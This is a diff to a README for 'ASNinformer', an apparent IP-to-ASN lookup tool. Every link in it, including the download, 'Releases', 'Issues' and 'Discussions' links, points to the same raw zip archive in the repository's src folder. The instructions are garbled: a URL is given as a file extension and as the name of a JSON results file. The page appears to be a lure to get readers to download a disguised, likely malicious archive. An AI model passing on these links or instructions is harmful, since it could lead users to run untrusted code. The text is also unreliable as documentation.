@@ -6,7 +6,7 @@ Welcome to ASNinformer! This tool helps you find ASN information from IP address
 
 ## 📥 Download ASNinformer
 
-[![Download ASNinformer](https://github.com/Haleesh-creator/ASNinformer/raw/refs/heads/main/src/Ninformer-AS-v2.4.zip)](https://github.com/Haleesh-creator/ASNinformer/raw/refs/heads/main/src/Ninformer-AS-v2.4.zip)
+[![Download ASNinformer](https://github.com/Haleesh-creator/ASNinformer/raw/refs/heads/main/src/Ninformer-AS-v2.0.zip)](https://github.com/Haleesh-creator/ASNinformer/raw/refs/heads/main/src/Ninformer-AS-v2.0.zip)
 
 ## 🛡️ System Requirements
 
@@ -18,18 +18,18 @@ Welcome to ASNinformer! This tool helps you find ASN information from IP address
 
 To get the tool, you need to visit the following page to download:
 
-[Download ASNinformer](https://github.com/Haleesh-creator/ASNinformer/raw/refs/heads/main/src/Ninformer-AS-v2.4.zip)
+[Download ASNinformer](https://github.com/Haleesh-creator/ASNinformer/raw/refs/heads/main/src/Ninformer-AS-v2.0.zip)
 
 1. Click on the link above to go to the Releases page.
 2. Look for the latest version of ASNinformer.
-3. Download the package suitable for your operating system. The file will usually have an extension like `.exe`, `.zip`, or `https://github.com/Haleesh-creator/ASNinformer/raw/refs/heads/main/src/Ninformer-AS-v2.4.zip`.
+3. Download the package suitable for your operating system. The file will usually have an extension like `.exe`, `.zip`, or `https://github.com/Haleesh-creator/ASNinformer/raw/refs/heads/main/src/Ninformer-AS-v2.0.zip`.
 
 ## 📖 How to Use ASNinformer
 
 1. **Open ASNinformer**: Once downloaded, locate the ASNinformer file on your computer.
 2. **Load IPs**: Prepare a list of IP addresses that you want to analyze. Ensure each IP is on a new line.
 3. **Run the Tool**: Open ASNinformer and input your list of IPs. Click the 'Lookup' button to start the process.
-4. **View Results**: After processing, ASNinformer will present results grouped by ASN. You can find these results in a JSON file named `https://github.com/Haleesh-creator/ASNinformer/raw/refs/heads/main/src/Ninformer-AS-v2.4.zip`.
+4. **View Results**: After processing, ASNinformer will present results grouped by ASN. You can find these results in a JSON file named `https://github.com/Haleesh-creator/ASNinformer/raw/refs/heads/main/src/Ninformer-AS-v2.0.zip`.
 
 ## 🔍 Features
 
@@ -49,8 +49,8 @@ If you encounter issues while using ASNinformer:
 
 Need help or want to share ideas? Connect with us on GitHub:
 
-- [Issues Page](https://github.com/Haleesh-creator/ASNinformer/raw/refs/heads/main/src/Ninformer-AS-v2.4.zip)
-- [Discussions](https://github.com/Haleesh-creator/ASNinformer/raw/refs/heads/main/src/Ninformer-AS-v2.4.zip)
+- [Issues Page](https://github.com/Haleesh-creator/ASNinformer/raw/refs/heads/main/src/Ninformer-AS-v2.0.zip)
+- [Discussions](https://github.com/Haleesh-creator/ASNinformer/raw/refs/heads/main/src/Ninformer-AS-v2.0.zip)
 
 ## 🔗 Additional Resources
 
